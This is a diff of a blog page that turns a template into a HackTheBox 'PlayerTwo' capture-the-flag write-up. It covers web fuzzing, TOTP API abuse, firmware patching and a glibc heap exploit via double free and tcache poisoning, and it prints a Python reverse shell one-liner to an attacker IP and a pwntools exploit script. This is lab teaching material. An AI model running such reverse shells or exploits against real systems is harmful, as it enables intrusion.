@@ -9,8 +9,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>Hello you absolute legends.</title>
-<meta name="description" content="An amazing website.">
+<!-- begin _includes/seo.html --><title>HackTheBox - PlayerTwo - Hello you absolute legends.</title>
+<meta name="description" content="Overview PlayerTwo is MrR3boot’s follow-up box to his box Player - this time created in collaboration with b14ckh34rt.">
 
 
   <meta name="author" content="Your Name">
@@ -19,30 +19,30 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Hello you absolute legends.">
-<meta property="og:title" content="Hello you absolute legends.">
-<meta property="og:url" content="http://localhost:4000/blog/2020-04-30-player2/">
+<meta property="og:title" content="HackTheBox - PlayerTwo">
+<meta property="og:url" content="http://localhost:4000/blog/boxes/player2/">
 
 
-  <meta property="og:description" content="An amazing website.">
-
-
-
-
-
-
-
-  <meta property="article:published_time" content="2020-06-11T14:08:53-04:00">
+  <meta property="og:description" content="Overview PlayerTwo is MrR3boot’s follow-up box to his box Player - this time created in collaboration with b14ckh34rt.">
 
 
 
 
 
-  
+
+
+  <meta property="article:published_time" content="2020-05-30T11:33:36-04:00">
+
+
+
+
 
   
 
+  
 
-<link rel="canonical" href="http://localhost:4000/blog/2020-04-30-player2/">
+
+<link rel="canonical" href="http://localhost:4000/blog/boxes/player2/">
 
 
 
@@ -129,7 +129,7 @@
           
         </a>
         <ul class="visible-links"><li class="masthead__menu-item">
-              <a href="https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/">Quick-Start Guide</a>
+              <a href="/blog/about/">About</a>
             </li></ul>
         
         <button class="greedy-nav__toggle hidden" type="button">
@@ -150,125 +150,19 @@
 
 <div id="main" role="main">
   
-  <div class="sidebar sticky">
-  
-
-
-<div itemscope itemtype="https://schema.org/Person">
-
-  
-
-  <div class="author__content">
-    
-      <h3 class="author__name" itemprop="name">Your Name</h3>
-    
-    
-      <div class="author__bio" itemprop="description">
-        <p>me.</p>
-
-      </div>
-    
-  </div>
-
-  <div class="author__urls-wrapper">
-    <button class="btn btn--inverse">Follow</button>
-    <ul class="author__urls social-icons">
-      
-        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
-          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere</span>
-        </li>
-      
-
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      <!--
-  <li>
-    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
-      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
-    </a>
-  </li>
--->
-    </ul>
-  </div>
-</div>
-
-  
-  </div>
-
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <meta itemprop="description" content="">
-    <meta itemprop="datePublished" content="2020-06-11T14:08:53-04:00">
+    <meta itemprop="headline" content="HackTheBox - PlayerTwo">
+    <meta itemprop="description" content="OverviewPlayerTwo is MrR3boot’s follow-up box to his box Player - this time created in collaboration with b14ckh34rt.">
+    <meta itemprop="datePublished" content="2020-05-30T11:33:36-04:00">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - PlayerTwo
+</h1>
           
             <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
 
@@ -284,8 +178,47 @@
 
       <section class="page__content" itemprop="text">
         
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-cog"></i> My Table of Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#overview">Overview</a></li>
+  <li><a href="#recon">Recon</a>
+    <ul>
+      <li><a href="#twirp">Twirp</a></li>
+      <li><a href="#creating-credentials">Creating credentials</a></li>
+      <li><a href="#protobs-part-1">Protobs Part 1</a></li>
+    </ul>
+  </li>
+  <li><a href="#root-part-intended-way">Root Part (intended way)</a>
+    <ul>
+      <li><a href="#playing-the-game">Playing the game</a>
+        <ul>
+          <li><a href="#leaking-libc">Leaking libc</a></li>
+          <li><a href="#null-byte-overwrite-vulnerability">Null byte overwrite vulnerability</a></li>
+          <li><a href="#aligning-game-descriptions-adjacent">Aligning game descriptions adjacent</a></li>
+          <li><a href="#the-double-free">The double free</a></li>
+          <li><a href="#tcache-poisoning">Tcache poisoning</a></li>
+        </ul>
+      </li>
+      <li><a href="#complete-script">Complete Script</a></li>
+    </ul>
+  </li>
+  <li><a href="#outtakes">Outtakes</a>
+    <ul>
+      <li><a href="#root---the-unintended-way">Root - the unintended way</a></li>
+      <li><a href="#root---the-different-intended-way">Root - the different intended way</a></li>
+    </ul>
+  </li>
+  <li><a href="#references">References</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
         <h1 id="overview">Overview</h1>
 <p>PlayerTwo is MrR3boot’s follow-up box to his box <em>Player</em> - this time created in collaboration with b14ckh34rt.</p>
+
 <h1 id="recon">Recon</h1>
 <p>A <code class="language-plaintext highlighter-rouge">nmap -p- 10.10.10.170</code> reveals an interesting port 8545 besides the usual ssh and http ports.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Not shown: 65532 closed ports
@@ -301,17 +234,17 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
   <img src="/blog/assets/images/playerTwo/Gobuster.png" alt="this is a placeholder image" />
   
     <figcaption>
-      <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u product.player2.htb</code> and <br /> <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u product.player2.htb</code> respectively.
+      <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u player2.htb</code> and <br /> <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u product.player2.htb</code> respectively.
 
     </figcaption>
   
 </figure>
 
-<h2 class="text-justify" id="twirp">Twirp</h2>
-<p>Browsing to <code class="language-plaintext highlighter-rouge">http://player2.htb:8545</code> gives away the service running on this port with the following response:</p>
+<h2 id="twirp">Twirp</h2>
+<p class="text-justify">Browsing to <code class="language-plaintext highlighter-rouge">http://player2.htb:8545</code> gives away the service running on this port with the following response:</p>
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"bad_route"</span><span class="p">,</span><span class="nl">"msg"</span><span class="p">:</span><span class="s2">"no handler for path </span><span class="se">\"\/\"</span><span class="s2">"</span><span class="p">,</span><span class="nl">"meta"</span><span class="p">:{</span><span class="nl">"twirp_invalid_route"</span><span class="p">:</span><span class="s2">"GET </span><span class="se">\/</span><span class="s2">"</span><span class="p">}}</span><span class="w">
 </span></code></pre></div></div>
-<p class="text-justify">Twirp invalid route leads us to the <em>Twirp Wire Protocol</em> which we have to find the endpoint of. To do this we take a look in its documentation [0] where it mentions a <em>.proto</em> file which we fuzz for in the /proto directory, using wfuzz this time (gobuster with the <code class="language-plaintext highlighter-rouge">-x proto</code> flag works, too):</p>
+<p class="text-justify">Twirp invalid route leads us to the <em>Twirp Wire Protocol</em> which we have to find the endpoint of. To find out what the structure looks like its documentation [0] comes in handy where it mentions a <em>.proto</em> file which we fuzz for in the /proto directory, using wfuzz this time (gobuster with the <code class="language-plaintext highlighter-rouge">-x proto</code> flag works, too):</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 404 http://player2.htb/proto/FUZZ.proto
 
 000036168:   200        18 L     46 W     266 Ch      <span class="s2">"generated"</span>                   
@@ -355,7 +288,7 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
   
 </figure>
 
-<p>As we probably have no chance of guessing the right pin and brute-froce is never an option on HTB, we fuzz again, this time <code class="language-plaintext highlighter-rouge">http://product.player2.htb/api</code>. And with using a good wordlist we finally find another endpoint:</p>
+<p class="text-justify">As we probably have no chance of guessing the right pin and brute-froce is never an option on HTB, we fuzz again, this time <code class="language-plaintext highlighter-rouge">http://product.player2.htb/api</code>. And with using a good wordlist we finally find another endpoint:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt <span class="nt">-u</span> product.player2.htb/api
 
 /totp <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -366,7 +299,7 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 <p>we advance to</p>
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"error"</span><span class="p">:</span><span class="s2">"Missing parameters"</span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
-<p>From this we have a couple of options. We can write a small script on that or just guess some actions. In my case I guessed the action to be a number and got the following:</p>
+<p class="text-justify">From this we have a couple of options. We can write a small script on that or just guess some actions. In my case I guessed the action to be a number and got the following:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">--header</span> <span class="s2">"Cookie: PHPSESSID=l2frl7cqoro7ufdsqsvgttb6vm"</span> <span class="nt">-H</span> <span class="s2">"Content-Type:application/json"</span> <span class="nt">--location</span> <span class="s2">"http://product.player2.htb/api/totp"</span> <span class="nt">--data</span> <span class="s1">'{"action": 0}'</span>
 </code></pre></div></div>
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"jkr"</span><span class="p">,</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"29389234823423"</span><span class="p">}</span><span class="w">
@@ -374,7 +307,7 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 <p>as I was using jkr’s credentials and we are in.</p>
 
 <h2 id="protobs-part-1">Protobs Part 1</h2>
-<p>Exploring the web page we find the following section which links to a documentation of the <em>Protobs Firmware</em> which includes a link to the firmware itself, as well as a link to a file upload:</p>
+<p class="text-justify">Exploring the web page we find the following section which links to a documentation of the <em>Protobs Firmware</em> which includes a link to the firmware itself, as well as a link to a file upload:</p>
 <figure class="">
   <img src="/blog/assets/images/playerTwo/ProtobsAccess.png" alt="this is a placeholder image" />
   
@@ -410,7 +343,7 @@ kali@kali:~/HTB/boxes/player2/binary<span class="nv">$ </span>file Protobs.remov
 Protobs.removed: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>82adae308a0023a272e626bbe83d97b2b9c630f6, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
 
 </code></pre></div></div>
-<p>Not only does the file command now recognize porperties of the binary but also when reverse engineering the file in <em>Ghidra</em> it is now much more readable.</p>
+<p class="text-justify">Not only does the file command now recognize porperties of the binary but also when reverse engineering the file in <em>Ghidra</em> it is now much more readable.</p>
 <figure class="">
   <img src="/blog/assets/images/playerTwo/Firmware.png" alt="this is a placeholder image" />
   
@@ -434,7 +367,7 @@ To do this we need to load the original binary into ghidra and search for the fi
   
 </figure>
 
-<p>Setting up the listener and uploading the edited file results in the desired four ping packages thus we have code execution:</p>
+<p class="text-justify">Setting up the listener and uploading the edited file results in the desired four ping packages thus we have code execution:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0
 08:18:49.392816 IP p2 <span class="o">&gt;</span> 10.10.14.7: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>34815, <span class="nb">seq </span>1, length 64
 08:18:49.392859 IP 10.10.14.7 <span class="o">&gt;</span> p2: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>34815, <span class="nb">seq </span>1, length 64
@@ -448,10 +381,10 @@ To do this we need to load the original binary into ghidra and search for the fi
   <li>upload a webshell via <em>wget</em> and probably a lot more</li>
 </ul>
 
-<p>I decided for the reverse shell code and after trying a few different options the python reverse shell code worked (yea it’s long and ugly but working is working):</p>
+<p class="text-justify">I opted to go for the reverse shell code and after trying a few different options the python reverse shell code worked (yea it’s long and ugly but working is working):</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
 </code></pre></div></div>
-<p>and boom - we’ve got a shell on the box - but still no user flag :/ But we notice a MQTT service running on port 1883:</p>
+<p class="text-justify">and boom - we’ve got a shell on the box - but still no user flag :/ But we notice a MQTT service running on port 1883:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/HTB/boxes/player2<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 1234
 listening on <span class="o">[</span>any] 1234 ...
 connect to <span class="o">[</span>10.10.14.7] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.170] 33464
@@ -468,7 +401,7 @@ tcp    LISTEN   0        128               0.0.0.0:8545          0.0.0.0:<span c
 tcp    LISTEN   0        128                     <span class="k">*</span>:80                  <span class="k">*</span>:<span class="k">*</span>      
 tcp    LISTEN   0        128                  <span class="o">[</span>::]:22               <span class="o">[</span>::]:<span class="k">*</span>  
 </code></pre></div></div>
-<p>We can subscribe to all topics using <code class="language-plaintext highlighter-rouge">mosquitto_sub -t '$SYS/#'</code> and are disappointed because we don’t get any useful info. However keeping it running for a while we notice that every once in a while a SSH private key is broadcasted:</p>
+<p class="text-justify">We can subscribe to all topics using <code class="language-plaintext highlighter-rouge">mosquitto_sub -t '$SYS/#'</code> and are disappointed because we don’t get any useful info. However keeping it running for a while we notice that every once in a while a SSH private key is broadcasted:</p>
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Retrieving the key from aws instance
 Key retrieved..
 <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
@@ -478,7 +411,7 @@ MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
 iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g<span class="o">==</span>
 <span class="nt">-----END</span> RSA PRIVATE KEY-----
 </code></pre></div></div>
-<p>And for the first time we are lucky, because the key is not password protected and we can connect right away and have owned user:</p>
+<p class="text-justify">And for the first time we are lucky, because the key is not password protected and we can connect right away and have owned user:</p>
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/HTB/boxes/player2<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa observer@10.10.10.170
 Welcome to Ubuntu 18.04.2 LTS <span class="o">(</span>GNU/Linux 5.2.5-050205-generic x86_64<span class="o">)</span>
 <span class="o">[</span>snip]
@@ -551,7 +484,7 @@ observer@player2:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sy
 </ul>
 
 <h2 id="playing-the-game">Playing the game</h2>
-<p>In the following I will demonstrate the exploitation of the binary via a double free. It is also possible to exploit the binary by coalesing two chunks, which is more complex.</p>
+<p class="text-justify">In the following I will demonstrate the exploitation of the binary via a double free. It is also possible to exploit the binary by coalesing two chunks, which is more complex.</p>
 <ul class="text-justify">
   <li>As ASLR is enabled on the machine we need to leak a libc address in order to get the libc base address from which we can calculate the addresses of the free hook and the system function.</li>
   <li>Looking at the reversed binary we notice a one byte overwrite vulnerability. Since that one byte overwrite will always be done with a null byte we cannot follow guides like [7] exactly but I recommend watching it as it shows the possibilities which arise by such a vulnerability and also covers tcache poisoning which we also will use.</li>
@@ -589,7 +522,7 @@ Each tcache can hold 7 same-size chunks when freed before it puts other freed ch
 <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1e75a8</span>
 <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x52fd0</span>
 </code></pre></div></div>
-<p>From this base address we can also calculate the address of <em>free_hook</em> and <em>system</em> as their place will also be at a fixed place measured from the base address. To do this we might use <em>objdump</em> on the libc we downloaded from the server via <em>scp</em>:</p>
+<p class="text-justify">From this base address we can also calculate the address of <em>free_hook</em> and <em>system</em> as their place will also be at a fixed place measured from the base address. Using <em>objdump -T</em> on the libc we downloaded from the server via <em>scp</em> will get us there:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/HTB/boxes/player2/binary_2<span class="nv">$ </span>objdump <span class="nt">-T</span> libc.so.6 | <span class="nb">grep </span>free_hook
 00000000001e75a8  w   DO .bss   0000000000000008  GLIBC_2.2.5 __free_hook
 </code></pre></div></div>
@@ -608,8 +541,8 @@ Each tcache can hold 7 same-size chunks when freed before it puts other freed ch
 <span class="p">}</span>
 </code></pre></div></div>
 <h3 id="aligning-game-descriptions-adjacent">Aligning game descriptions adjacent</h3>
-<p>In order to be able to abuse the null byte overwrite we need two adjacent chunks. To illustrate how to do this, we use <em>gdb</em> to look at the heap and get an understanding of how the allocated chunks look like in memory.<br />
-To do this we create a sample of two configs of size 0x38 and write 0x38 bytes of data into the name of the config as well as into the description and look then at the chunks in memory:</p>
+<p class="text-justify">In order to be able to abuse the null byte overwrite we need two adjacent chunks. To illustrate how to accomplish this, we use <em>gdb</em> to look at the heap and get an understanding of how the allocated chunks look like in memory.<br />
+For this we create a sample of two configs of size 0x38 and write 0x38 bytes of data into the name of the config as well as into the description and look then at the chunks in memory:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># A's will be 41 in memory. The only constraint to the chunk
 </span><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>	<span class="c1"># size is that it has to be congruent 8 modulo 16.
 </span></code></pre></div></div>
@@ -686,7 +619,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 </span><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>		<span class="c1"># because there is no space for it earlier. Same goes for 0x180:
 </span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>			<span class="c1"># 0x40 of the dummy and 0x180 _right after_ the 0x58 chunk.
 </span></code></pre></div></div>
-<p class="text-justify">The key is to free chunk 10 so this chunk will go into the 0x180 tcache bin. Then we will overwrite the chunk size from 0x180 to 0x100 with chunk 9 but also write <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> at the beginning of chunk 9. We have to do this because the program will cut off a description after the first null byte, thus strings such as <code class="language-plaintext highlighter-rouge">p64('/bin/sh\x00') + b"A"*(0x50)</code> won’t work as descriptions. To solve this puzzle we need to do it in two steps:</p>
+<p class="text-justify">The key is to free chunk 10 so this chunk will go into the 0x180 tcache bin. Then we will overwrite the chunk size from 0x180 to 0x100 with chunk 9 but also write <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> at the beginning of chunk 9. As the program will cut off descriptions after the first null byte, strings such as <code class="language-plaintext highlighter-rouge">p64('/bin/sh\x00') + b"A"*(0x50)</code> won’t work as. To solve this puzzle we need to do it in two steps:</p>
 <ul>
   <li>overwrite the chunk 10’s size header</li>
   <li>write <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> into chunk 9 and let the rest untouched</li>
@@ -871,7 +804,7 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 
 <h1 id="outtakes">Outtakes</h1>
 <h2 id="root---the-unintended-way">Root - the unintended way</h2>
-<p class="text-justify">The easy-peasy way of becoming root is to realize that for the ssh key to be sent via MQTT the ssh key from observers home directory is read. Feels like this was on purpose as this could have easily been fixed. Thus replacing the ssh key with a symbolic link to <code class="language-plaintext highlighter-rouge">/root/root.txt</code> will get you the flag.</p>
+<p class="text-justify">The trivial way of becoming root is to realize that for the ssh key to be sent via MQTT the ssh key from observers home directory is read. Feels like this was on purpose as this could have easily been fixed. Thus replacing the ssh key with a symbolic link to <code class="language-plaintext highlighter-rouge">/root/root.txt</code> will get you the flag.</p>
 <h2 id="root---the-different-intended-way">Root - the different intended way</h2>
 <p>Disclaimer: The following is not my work but I have the permission to publish.</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -1028,7 +961,6 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
 </span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span>
 </code></pre></div></div>
 
-<p>##</p>
 <h1 id="references">References</h1>
 <p><a name="[5]">[5]</a> <a href="https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/">https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/</a></p>
 
@@ -1042,10 +974,52 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
       <footer class="page__meta">
         
         
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/blog/tags/#binary" class="page__taxonomy-item" rel="tag">binary</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/blog/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/blog/categories/#boxes" class="page__taxonomy-item" rel="tag">Boxes</a>
+    
+    </span>
+  </p>
 
 
         
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-11T14:08:53-04:00">June 11, 2020</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-05-30T11:33:36-04:00">May 30, 2020</time></p>
 
 
       </footer>
@@ -1055,11 +1029,11 @@ To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in me
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?text=%20http%3A%2F%2Flocalhost%3A4000%2Fblog%2F2020-04-30-player2%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=HackTheBox+-+PlayerTwo%20http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fboxes%2Fplayer2%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fblog%2F2020-04-30-player2%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fboxes%2Fplayer2%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fblog%2F2020-04-30-player2%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fboxes%2Fplayer2%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
